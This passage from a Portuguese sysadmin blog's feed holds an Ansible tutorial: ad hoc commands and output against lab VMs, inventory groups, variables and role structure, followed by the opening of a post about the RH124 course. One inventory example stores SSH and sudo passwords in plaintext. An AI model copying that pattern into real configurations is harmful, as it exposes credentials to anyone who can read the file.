osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.151 -u osboxes -k -b -m systemd -a &amp;#34;name=ssh state=restarted&amp;#34; osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.151 -u osboxes -k -b -m systemd -a &amp;#34;name=ssh state=restarted&amp;#34; [WARNING]: log file at /var/log/ansible.log is not writeable and we cannot create it, aborting SSH password: 192.168.1.151 | CHANGED =&amp;gt; { &amp;#34;ansible_facts&amp;#34;: { &amp;#34;discovered_interpreter_python&amp;#34;: &amp;#34;/usr/bin/python&amp;#34; }, &amp;#34;changed&amp;#34;: true, &amp;#34;name&amp;#34;: &amp;#34;ssh&amp;#34;, &amp;#34;state&amp;#34;: &amp;#34;started&amp;#34;, &amp;#34;status&amp;#34;: { &amp;#34;ActiveEnterTimestamp&amp;#34;: &amp;#34;Wed 2021-04-07 22:52:06 EDT&amp;#34;, &amp;#34;ActiveEnterTimestampMonotonic&amp;#34;: &amp;#34;246017520&amp;#34;, &amp;#34;ActiveExitTimestampMonotonic&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;ActiveState&amp;#34;: &amp;#34;active&amp;#34;, &amp;#34;After&amp;#34;: &amp;#34;system.slice -.mount network.target auditd.service systemd-journald.socket basic.target sysinit.target&amp;#34;, &amp;#34;AllowIsolate&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;AmbientCapabilities&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;AssertResult&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;AssertTimestamp&amp;#34;: &amp;#34;Wed 2021-04-07 22:52:06 EDT&amp;#34;, &amp;#34;AssertTimestampMonotonic&amp;#34;: &amp;#34;245980232&amp;#34;, &amp;#34;Before&amp;#34;: &amp;#34;multi-user.target shutdown.target&amp;#34;, &amp;#34;BlockIOAccounting&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;BlockIOWeight&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;CPUAccounting&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;CPUQuotaPerSecUSec&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;CPUSchedulingPolicy&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;CPUSchedulingPriority&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;CPUSchedulingResetOnFork&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;CPUShares&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;CPUUsageNSec&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;CPUWeight&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;CacheDirectoryMode&amp;#34;: &amp;#34;0755&amp;#34;, &amp;#34;CanIsolate&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;CanReload&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;CanStart&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;CanStop&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;CapabilityBoundingSet&amp;#34;: &amp;#34;cap_chown cap_dac_override cap_dac_read_search cap_fowner cap_fsetid cap_kill cap_setgid cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config cap_mknod cap_lease cap_audit_write cap_audit_control cap_setfcap cap_mac_override cap_mac_admin cap_syslog cap_wake_alarm cap_block_suspend&amp;#34;, &amp;#34;CollectMode&amp;#34;: &amp;#34;inactive&amp;#34;, &amp;#34;ConditionResult&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;ConditionTimestamp&amp;#34;: &amp;#34;Wed 2021-04-07 22:52:06 EDT&amp;#34;, &amp;#34;ConditionTimestampMonotonic&amp;#34;: &amp;#34;245980220&amp;#34;, &amp;#34;ConfigurationDirectoryMode&amp;#34;: &amp;#34;0755&amp;#34;, &amp;#34;Conflicts&amp;#34;: &amp;#34;shutdown.target&amp;#34;, &amp;#34;ControlGroup&amp;#34;: &amp;#34;/system.slice/ssh.service&amp;#34;, &amp;#34;ControlPID&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;DefaultDependencies&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;Delegate&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;Description&amp;#34;: &amp;#34;OpenBSD Secure Shell server&amp;#34;, &amp;#34;DevicePolicy&amp;#34;: &amp;#34;auto&amp;#34;, &amp;#34;Documentation&amp;#34;: &amp;#34;man:sshd(8) man:sshd_config(5)&amp;#34;, &amp;#34;DynamicUser&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;EnvironmentFiles&amp;#34;: &amp;#34;/etc/default/ssh (ignore_errors=yes)&amp;#34;, &amp;#34;ExecMainCode&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;ExecMainExitTimestampMonotonic&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;ExecMainPID&amp;#34;: &amp;#34;2270&amp;#34;, &amp;#34;ExecMainStartTimestamp&amp;#34;: &amp;#34;Wed 2021-04-07 22:52:06 EDT&amp;#34;, &amp;#34;ExecMainStartTimestampMonotonic&amp;#34;: &amp;#34;246010909&amp;#34;, &amp;#34;ExecMainStatus&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;ExecReload&amp;#34;: &amp;#34;{ path=/bin/kill ; argv[]=/bin/kill -HUP $MAINPID ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }&amp;#34;, &amp;#34;ExecStart&amp;#34;: &amp;#34;{ path=/usr/sbin/sshd ; argv[]=/usr/sbin/sshd -D $SSHD_OPTS ; ignore_errors=no ; start_time=[Wed 2021-04-07 22:52:06 EDT] ; stop_time=[n/a] ; pid=2270 ; code=(null) ; status=0/0 }&amp;#34;, &amp;#34;ExecStartPre&amp;#34;: &amp;#34;{ path=/usr/sbin/sshd ; argv[]=/usr/sbin/sshd -t ; ignore_errors=no ; start_time=[Wed 2021-04-07 22:52:06 EDT] ; stop_time=[Wed 2021-04-07 22:52:06 EDT] ; pid=2269 ; code=exited ; status=0 }&amp;#34;, &amp;#34;FailureAction&amp;#34;: &amp;#34;none&amp;#34;, &amp;#34;FailureActionExitStatus&amp;#34;: &amp;#34;-1&amp;#34;, &amp;#34;FileDescriptorStoreMax&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;FinalKillSignal&amp;#34;: &amp;#34;9&amp;#34;, &amp;#34;FragmentPath&amp;#34;: &amp;#34;/lib/systemd/system/ssh.service&amp;#34;, &amp;#34;GID&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;GuessMainPID&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;IOAccounting&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;IOSchedulingClass&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;IOSchedulingPriority&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;IOWeight&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;IPAccounting&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;IPEgressBytes&amp;#34;: &amp;#34;18446744073709551615&amp;#34;, &amp;#34;IPEgressPackets&amp;#34;: &amp;#34;18446744073709551615&amp;#34;, &amp;#34;IPIngressBytes&amp;#34;: &amp;#34;18446744073709551615&amp;#34;, &amp;#34;IPIngressPackets&amp;#34;: &amp;#34;18446744073709551615&amp;#34;, &amp;#34;Id&amp;#34;: &amp;#34;ssh.service&amp;#34;, &amp;#34;IgnoreOnIsolate&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;IgnoreSIGPIPE&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;InactiveEnterTimestamp&amp;#34;: &amp;#34;Wed 2021-04-07 22:48:07 EDT&amp;#34;, &amp;#34;InactiveEnterTimestampMonotonic&amp;#34;: &amp;#34;5387216&amp;#34;, &amp;#34;InactiveExitTimestamp&amp;#34;: &amp;#34;Wed 2021-04-07 22:52:06 EDT&amp;#34;, &amp;#34;InactiveExitTimestampMonotonic&amp;#34;: &amp;#34;245983310&amp;#34;, &amp;#34;InvocationID&amp;#34;: &amp;#34;6561c69561a14f76842d4a1ce3592f4a&amp;#34;, &amp;#34;JobRunningTimeoutUSec&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;JobTimeoutAction&amp;#34;: &amp;#34;none&amp;#34;, &amp;#34;JobTimeoutUSec&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;KeyringMode&amp;#34;: &amp;#34;private&amp;#34;, &amp;#34;KillMode&amp;#34;: &amp;#34;process&amp;#34;, &amp;#34;KillSignal&amp;#34;: &amp;#34;15&amp;#34;, &amp;#34;LimitAS&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitASSoft&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitCORE&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitCORESoft&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;LimitCPU&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitCPUSoft&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitDATA&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitDATASoft&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitFSIZE&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitFSIZESoft&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitLOCKS&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitLOCKSSoft&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitMEMLOCK&amp;#34;: &amp;#34;65536&amp;#34;, &amp;#34;LimitMEMLOCKSoft&amp;#34;: &amp;#34;65536&amp;#34;, &amp;#34;LimitMSGQUEUE&amp;#34;: &amp;#34;819200&amp;#34;, &amp;#34;LimitMSGQUEUESoft&amp;#34;: &amp;#34;819200&amp;#34;, &amp;#34;LimitNICE&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;LimitNICESoft&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;LimitNOFILE&amp;#34;: &amp;#34;524288&amp;#34;, &amp;#34;LimitNOFILESoft&amp;#34;: &amp;#34;1024&amp;#34;, &amp;#34;LimitNPROC&amp;#34;: &amp;#34;3795&amp;#34;, &amp;#34;LimitNPROCSoft&amp;#34;: &amp;#34;3795&amp;#34;, &amp;#34;LimitRSS&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitRSSSoft&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitRTPRIO&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;LimitRTPRIOSoft&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;LimitRTTIME&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitRTTIMESoft&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitSIGPENDING&amp;#34;: &amp;#34;3795&amp;#34;, &amp;#34;LimitSIGPENDINGSoft&amp;#34;: &amp;#34;3795&amp;#34;, &amp;#34;LimitSTACK&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;LimitSTACKSoft&amp;#34;: &amp;#34;8388608&amp;#34;, &amp;#34;LoadState&amp;#34;: &amp;#34;loaded&amp;#34;, &amp;#34;LockPersonality&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;LogLevelMax&amp;#34;: &amp;#34;-1&amp;#34;, &amp;#34;LogRateLimitBurst&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;LogRateLimitIntervalUSec&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;LogsDirectoryMode&amp;#34;: &amp;#34;0755&amp;#34;, &amp;#34;MainPID&amp;#34;: &amp;#34;2270&amp;#34;, &amp;#34;MemoryAccounting&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;MemoryCurrent&amp;#34;: &amp;#34;5312512&amp;#34;, &amp;#34;MemoryDenyWriteExecute&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;MemoryHigh&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;MemoryLimit&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;MemoryLow&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;MemoryMax&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;MemoryMin&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;MemorySwapMax&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;MountAPIVFS&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;MountFlags&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;NFileDescriptorStore&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;NRestarts&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;Names&amp;#34;: &amp;#34;ssh.service&amp;#34;, &amp;#34;NeedDaemonReload&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;Nice&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;NoNewPrivileges&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;NonBlocking&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;NotifyAccess&amp;#34;: &amp;#34;main&amp;#34;, &amp;#34;OOMScoreAdjust&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;OnFailureJobMode&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;Perpetual&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;PrivateDevices&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;PrivateMounts&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;PrivateNetwork&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;PrivateTmp&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;PrivateUsers&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;ProtectControlGroups&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;ProtectHome&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;ProtectKernelModules&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;ProtectKernelTunables&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;ProtectSystem&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;RefuseManualStart&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;RefuseManualStop&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;RemainAfterExit&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;RemoveIPC&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;Requires&amp;#34;: &amp;#34;sysinit.target -.mount system.slice&amp;#34;, &amp;#34;RequiresMountsFor&amp;#34;: &amp;#34;/run/sshd&amp;#34;, &amp;#34;Restart&amp;#34;: &amp;#34;on-failure&amp;#34;, &amp;#34;RestartUSec&amp;#34;: &amp;#34;100ms&amp;#34;, &amp;#34;RestrictNamespaces&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;RestrictRealtime&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;Result&amp;#34;: &amp;#34;success&amp;#34;, &amp;#34;RootDirectoryStartOnly&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;RuntimeDirectory&amp;#34;: &amp;#34;sshd&amp;#34;, &amp;#34;RuntimeDirectoryMode&amp;#34;: &amp;#34;0755&amp;#34;, &amp;#34;RuntimeDirectoryPreserve&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;RuntimeMaxUSec&amp;#34;: &amp;#34;infinity&amp;#34;, &amp;#34;SameProcessGroup&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;SecureBits&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;SendSIGHUP&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;SendSIGKILL&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;Slice&amp;#34;: &amp;#34;system.slice&amp;#34;, &amp;#34;StandardError&amp;#34;: &amp;#34;inherit&amp;#34;, &amp;#34;StandardInput&amp;#34;: &amp;#34;null&amp;#34;, &amp;#34;StandardInputData&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;StandardOutput&amp;#34;: &amp;#34;journal&amp;#34;, &amp;#34;StartLimitAction&amp;#34;: &amp;#34;none&amp;#34;, &amp;#34;StartLimitBurst&amp;#34;: &amp;#34;5&amp;#34;, &amp;#34;StartLimitIntervalUSec&amp;#34;: &amp;#34;10s&amp;#34;, &amp;#34;StartupBlockIOWeight&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;StartupCPUShares&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;StartupCPUWeight&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;StartupIOWeight&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;StateChangeTimestamp&amp;#34;: &amp;#34;Wed 2021-04-07 22:52:06 EDT&amp;#34;, &amp;#34;StateChangeTimestampMonotonic&amp;#34;: &amp;#34;246017520&amp;#34;, &amp;#34;StateDirectoryMode&amp;#34;: &amp;#34;0755&amp;#34;, &amp;#34;StatusErrno&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;StopWhenUnneeded&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;SubState&amp;#34;: &amp;#34;running&amp;#34;, &amp;#34;SuccessAction&amp;#34;: &amp;#34;none&amp;#34;, &amp;#34;SuccessActionExitStatus&amp;#34;: &amp;#34;-1&amp;#34;, &amp;#34;SyslogFacility&amp;#34;: &amp;#34;3&amp;#34;, &amp;#34;SyslogLevel&amp;#34;: &amp;#34;6&amp;#34;, &amp;#34;SyslogLevelPrefix&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;SyslogPriority&amp;#34;: &amp;#34;30&amp;#34;, &amp;#34;SystemCallErrorNumber&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;TTYReset&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;TTYVHangup&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;TTYVTDisallocate&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;TasksAccounting&amp;#34;: &amp;#34;yes&amp;#34;, &amp;#34;TasksCurrent&amp;#34;: &amp;#34;1&amp;#34;, &amp;#34;TasksMax&amp;#34;: &amp;#34;1138&amp;#34;, &amp;#34;TimeoutStartUSec&amp;#34;: &amp;#34;1min 30s&amp;#34;, &amp;#34;TimeoutStopUSec&amp;#34;: &amp;#34;1min 30s&amp;#34;, &amp;#34;TimerSlackNSec&amp;#34;: &amp;#34;50000&amp;#34;, &amp;#34;Transient&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;Type&amp;#34;: &amp;#34;notify&amp;#34;, &amp;#34;UID&amp;#34;: &amp;#34;[not set]&amp;#34;, &amp;#34;UMask&amp;#34;: &amp;#34;0022&amp;#34;, &amp;#34;UnitFilePreset&amp;#34;: &amp;#34;enabled&amp;#34;, &amp;#34;UnitFileState&amp;#34;: &amp;#34;enabled&amp;#34;, &amp;#34;UtmpMode&amp;#34;: &amp;#34;init&amp;#34;, &amp;#34;WantedBy&amp;#34;: &amp;#34;multi-user.target&amp;#34;, &amp;#34;WatchdogSignal&amp;#34;: &amp;#34;6&amp;#34;, &amp;#34;WatchdogTimestampMonotonic&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;WatchdogUSec&amp;#34;: &amp;#34;0&amp;#34; } } Um modulo muito legal tamb√©m √© o modulo &amp;lsquo;shell&amp;rsquo; que posso executar qualquer comando dentro do meu alvo.
osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.151 -u osboxes -k -b -m shell -a &amp;#34;systemctl status ssh&amp;#34; [WARNING]: log file at /var/log/ansible.log is not writeable and we cannot create it, aborting SSH password: 192.168.1.151 | CHANGED | rc=0 &amp;gt;&amp;gt; ‚óè ssh.service - OpenBSD Secure Shell server Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled) Active: active (running) since Wed 2021-04-07 23:22:56 EDT; 6min ago Docs: man:sshd(8) man:sshd_config(5) Process: 2437 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS) Main PID: 2438 (sshd) Tasks: 1 (limit: 1138) Memory: 2.4M CGroup: /system.slice/ssh.service ‚îî‚îÄ2438 /usr/sbin/sshd -D Apr 07 23:22:56 node2 systemd[1]: Starting OpenBSD Secure Shell server... Apr 07 23:22:56 node2 sshd[2438]: Server listening on 0.0.0.0 port 22. Apr 07 23:22:56 node2 sshd[2438]: Server listening on :: port 22. Apr 07 23:22:56 node2 systemd[1]: Started OpenBSD Secure Shell server. Apr 07 23:26:56 node2 sshd[2446]: Accepted password for osboxes from 192.168.1.168 port 52234 ssh2 Apr 07 23:26:56 node2 sshd[2446]: pam_unix(sshd:session): session opened for user osboxes by (uid=0) Apr 07 23:29:11 node2 sshd[2478]: Accepted password for osboxes from 192.168.1.168 port 52236 ssh2 Apr 07 23:29:11 node2 sshd[2478]: pam_unix(sshd:session): session opened for user osboxes by (uid=0) Se eu n√£o tivesse um usu√°rio comum com poderes de eleva√ß√£o de privil√©gio eu posso usar a flag &amp;lsquo;-K&amp;rsquo; maiusculo para solicitar a senha de super usu√°rio para eleva√ß√£o. (isso caso meu usu√°rio comum n√£o tivesse permiss√µes)
osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.151 -u osboxes -k -K -m shell -a &amp;#34;systemctl status ssh&amp;#34; [WARNING]: log file at /var/log/ansible.log is not writeable and we cannot create it, aborting SSH password: BECOME password[defaults to SSH password]: 192.168.1.151 | CHANGED | rc=0 &amp;gt;&amp;gt; ‚óè ssh.service - OpenBSD Secure Shell server Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled) Active: active (running) since Wed 2021-04-07 23:22:56 EDT; 8min ago Docs: man:sshd(8) man:sshd_config(5) Process: 2437 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS) Main PID: 2438 (sshd) Tasks: 1 (limit: 1138) Memory: 2.4M CGroup: /system.slice/ssh.service ‚îî‚îÄ2438 /usr/sbin/sshd -D Uma outra op√ß√£o seria tamb√©m n√£o especificar nenhum modulo, ele vai pegar o modulo command por padr√£o.
exemplo:
osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.151 -u osboxes -k -a &amp;#34;pwd&amp;#34; SSH password: 192.168.1.151 | CHANGED | rc=0 &amp;gt;&amp;gt; /home/osboxes =&amp;gt; flag -u, determino usu√°rio
=&amp;gt; flag -k, senha
=&amp;gt; flag -i, invent√°rio que ser√° utilizado
=&amp;gt; flag -K, solicita a eleva√ß√£o de privil√©gio
=&amp;gt; flag -b, executar eleva√ß√£o de privil√©gio (especificar no ansible.cfg)
=&amp;gt; flag -m, modulo que ser√° utilizado
=&amp;gt; flag -a, argumento do modulo
para obter ajuda pode fazer tamb√©m o &amp;ndash;help = ajuda.
Posso tamb√©m dar um comando &amp;lsquo;all&amp;rsquo; se meus targets estiverem dentro do arquivo hosts.
root@FXSHELL /e/ansible# cat hosts 192.168.1.151 192.168.1.234 root@FXSHELL /e/ansible# ansible all -m ping -u osboxes -k SSH password: 192.168.1.151 | SUCCESS =&amp;gt; { &amp;#34;ansible_facts&amp;#34;: { &amp;#34;discovered_interpreter_python&amp;#34;: &amp;#34;/usr/bin/python&amp;#34; }, &amp;#34;changed&amp;#34;: false, &amp;#34;ping&amp;#34;: &amp;#34;pong&amp;#34; } 192.168.1.234 | SUCCESS =&amp;gt; { &amp;#34;ansible_facts&amp;#34;: { &amp;#34;discovered_interpreter_python&amp;#34;: &amp;#34;/usr/bin/python&amp;#34; }, &amp;#34;changed&amp;#34;: false, &amp;#34;ping&amp;#34;: &amp;#34;pong&amp;#34; } Imagine que eu preciso executar isso em muitos hosts, para facilitar isso existe uma forma de trabalhar com grupos, dentro do arquivo de hosts.
Exemplo, no arquivo hosts:
[servidores_bd] 192.168.1.151 [servidores_web] 192.168.1.234 ansible -i hosts servidores_bd -m ping -u osboxes -k Tamb√©m posso colocar um subgrupo, exemplo:
[servidores:children] servidores_web servidores_bd Ele visualizara todos os subgrupos dele e executar√° os comandos.
Tamb√©m posso utilizar vari√°veis para ajudar na identifica√ß√£o dos hosts, como por exemplo.
Posso setar a variav√©l
mysql ansible_ssh_host=192.168.1.234 Posso aplicar regras tamb√©m para grupos de servidores como por exemplo:
[servidores_bd:vars] ansible_ssh&#43;port=22 ansible_ssh_user=osboxes ansible_ssh_pass=osboxes.org ansible_become=yes ansible_become_method=sudo ansible_become_user=osboxes ansible_become_pass=osboxes ansible_connection=ssh Por padr√£o o ansible trabalha com o python 2.7, mas √© possivel alterar o intepretador coma a v√°riavel:
ansible_python_interpreter=(localiza√ß√£o do python) Com isso basta eu executar as regras s√≥ o comando com o modulo &amp;lsquo;ping&amp;rsquo;.
root@FXSHELL /e/ansible# ansible -i hosts servidores_web -m ping 192.168.1.234 | SUCCESS =&amp;gt; { &amp;#34;ansible_facts&amp;#34;: { &amp;#34;discovered_interpreter_python&amp;#34;: &amp;#34;/usr/bin/python&amp;#34; }, &amp;#34;changed&amp;#34;: false, &amp;#34;ping&amp;#34;: &amp;#34;pong&amp;#34; } Oque s√£o Roles As roles (fun√ß√µes) s√£o um conjunto de intes independentes destinados a provisionar uma determinada aplica√ß√£o/infraestrutura.
Itens:
=&amp;gt; Variaveis
=&amp;gt; Modulos
=&amp;gt; Modelos
=&amp;gt; Tarefas
=&amp;gt; A√ß√µes
Pode-se associar-se roles com projetos.
As roles possuem uma estrutura padr√£o de diret√≥rios para seus projetos:
playbook.yml ‚îî‚îÄ‚îÄ roles ‚îî‚îÄ‚îÄ common ‚îú‚îÄ‚îÄ defaults ‚îú‚îÄ‚îÄ files ‚îú‚îÄ‚îÄ handlers ‚îú‚îÄ‚îÄ meta ‚îú‚îÄ‚îÄ tasks ‚îú‚îÄ‚îÄ templates ‚îî‚îÄ‚îÄ vars Tasks =&amp;gt; lista de tarefas para serem executadas em uma role.
handlers =&amp;gt; s√£o manipuladores/eventos acionados por uma task.
files =&amp;gt; arquivos utilizados para deploy dentro de uma role.
templates =&amp;gt; modelos para deploy dentro de uma role (permite o uso de vari√°veis)
vars =&amp;gt; vari√°veis adicionais de uma role.
defaults =&amp;gt; vari√°veis padr√£o de uma role. Prioridade m√°xima.
meta =&amp;gt; traga depend√™ncias de uma role para outra role - primeiro diret√≥rio a ser analisado.
Nota: dentro dos diretorios tasks, handlers, vars, defaults e meta, dever√° existir um arquivo com o nome de main.yml para que o mesmo seja interpretado.
Dentro do playbook eu preciso ter:
hosts: webserver roles: -common -nginx -php -mysql Nota: O que determina a execu√ß√£o de uma role s√£o as tasks, cadastradas no arquivo &amp;rsquo;tasks/main.yml&amp;rsquo;.
Vari√°veis S√£o utilizadas pelo ansible para lhe ajudar a trabalhar com diferentes tipos de sistemas, arquiteturas e/ou lhe auxiliar no processo de repeti√ß√£o durante a execu√ß√£o de uma role.
O ansible interpreta as vari√°veis de diferentes arquivos. Para isso o mesmo mant√©m a seguinte ordem de prioridades (do menor para o maior):
1. role/defaults/main.yml 2. inventory file 3. host_vars/* 4. group_vars/* 5. roles/vars/main.yml As vari√°veis s√£o comumente utilizadas pelos SysAdmin para facilitar no provisionamento de seus sistemas/infraestrutura. Entretando, o ansible permite atrav√©s do modulo setup obter o que chamamos de Systems Facts.
Os Systems Facts s√£o descobertos pelo ansible atrav√©s do modulo setup, trazendo informa√ß√µes de todo o sistema. Experimente executar o comando:
ansible hostname -m setup Para separar um pouco mais as regras coloquei minhas variaveis dentro de group_vars, com ordem de prioridade 4.
‚îú‚îÄ‚îÄ group_vars ‚îÇ ‚îî‚îÄ‚îÄ servidores ‚îú‚îÄ‚îÄ hosts ‚îú‚îÄ‚îÄ host_vars ‚îî‚îÄ‚îÄ roles ]]></content:encoded>
    </item>
    <item>
      <title>Redhat RH124</title>
      <link>https://fxshelll.github.io/posts/redhat-rh124/</link>
      <pubDate>Wed, 17 Mar 2021 02:03:55 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/redhat-rh124/</guid>
      <description>Red Hat System Administration I O curso Red Hat System Administration I (RH124) foi desenvolvido para profissionais de TI sem experi√™ncia anterior em administra√ß√£o de sistemas Linux. O recurso tem como objetivo fornecer aos alunos &amp;ldquo;habilidades de sobreviv√™ncia&amp;rdquo; de administra√ß√£o do Linux, com foco em tarefas centrais de administra√ß√£o. O Red Hat System Administration I tamb√©m oferece uma base para os alunos que planejam se tornar administradores de sistemas Linux em tempo integral, apresentando os principais conceitos de linha de comando e ferramentas de n√≠vel corporativo.</description>
      <content:encoded><![CDATA[
Red Hat System Administration I O curso Red Hat System Administration I (RH124) foi desenvolvido para profissionais de TI sem experi√™ncia anterior em administra√ß√£o de sistemas Linux. O recurso tem como objetivo fornecer aos alunos &amp;ldquo;habilidades de sobreviv√™ncia&amp;rdquo; de administra√ß√£o do Linux, com foco em tarefas centrais de administra√ß√£o. O Red Hat System Administration I tamb√©m oferece uma base para os alunos que planejam se tornar administradores de sistemas Linux em tempo integral, apresentando os principais conceitos de linha de comando e ferramentas de n√≠vel corporativo. Esses conceitos ser√£o mais desenvolvidos no pr√≥ximo curso, Red Hat System Administration II (RH134).
